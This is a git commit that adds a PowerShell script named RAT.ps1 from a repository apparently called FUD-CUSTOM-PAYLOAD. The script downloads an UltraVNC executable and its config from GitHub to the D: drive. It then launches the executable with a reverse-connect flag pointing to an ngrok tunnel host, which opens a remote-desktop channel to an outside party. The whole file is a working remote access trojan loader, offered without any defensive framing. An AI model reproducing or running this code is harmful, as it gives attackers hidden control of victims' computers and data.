082407d8d41d758e3cfea179cae1936c3800c23d
AKASH <87299311+gamkers@users.noreply.github.com>
2024-06-08 12:05:21 +0530

    Add files via upload

---
+++ RAT.ps1
@@ -0,0 +1,24 @@
+# Define URLs and file paths
+$exeUrl = "https://raw.githubusercontent.com/gamkers/FUD-CUSTOM-PAYLOAD/main/winvnc.exe"
+$iniUrl = "https://github.com/gamkers/FUD-CUSTOM-PAYLOAD/raw/main/UltraVNC.ini"
+$exePath = "D:\winvnc.exe"
+$iniPath = "D:\UltraVNC.ini"
+
+# Function to download a file
+function Download-File {
+    param (
+        [string]$url,
+        [string]$outputPath
+    )
+    
+    Invoke-WebRequest -Uri $url -OutFile $outputPath
+}
+
+# Download the EXE file
+Download-File -url $exeUrl -outputPath $exePath
+
+# Download the INI file
+Download-File -url $iniUrl -outputPath $iniPath
+
+# Execute the EXE file with parameters
+Start-Process -FilePath $exePath -ArgumentList "-connect 0.tcp.in.ngrok.io:19674"
